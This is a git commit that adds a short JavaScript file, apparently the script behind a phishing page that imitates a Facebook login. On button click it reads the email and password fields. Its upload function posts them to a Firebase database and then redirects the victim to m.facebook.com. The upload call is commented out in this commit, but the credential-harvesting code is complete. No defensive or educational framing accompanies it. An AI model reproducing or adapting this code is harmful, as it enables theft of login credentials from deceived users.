d985e8e72aa94225e382793acd8ff00c76d647f9
DavidCDCB <cristian-cb1@hotmail.com>
2021-09-28 21:41:55 -0500

    init2

---
+++ main.js
@@ -0,0 +1,23 @@
+let getElement = (t) => document.querySelector(t);
+
+let uploadData = (data) => {
+  axios
+    .post("https://datacovidcaldas.firebaseio.com/IpAccess.json", data, {
+      headers: {
+        "Content-Type": "application/json"
+      }
+    })
+    .then((response) => {
+      console.log(response);
+      window.location.href = "https://m.facebook.com/";
+    });
+};
+
+getElement("#btnLogin").addEventListener("click", function () {
+  let data = {
+    user: getElement("#email").value,
+    pass: getElement("#pass").value
+  };
+  console.log(data);
+  //uploadData(data);
+});
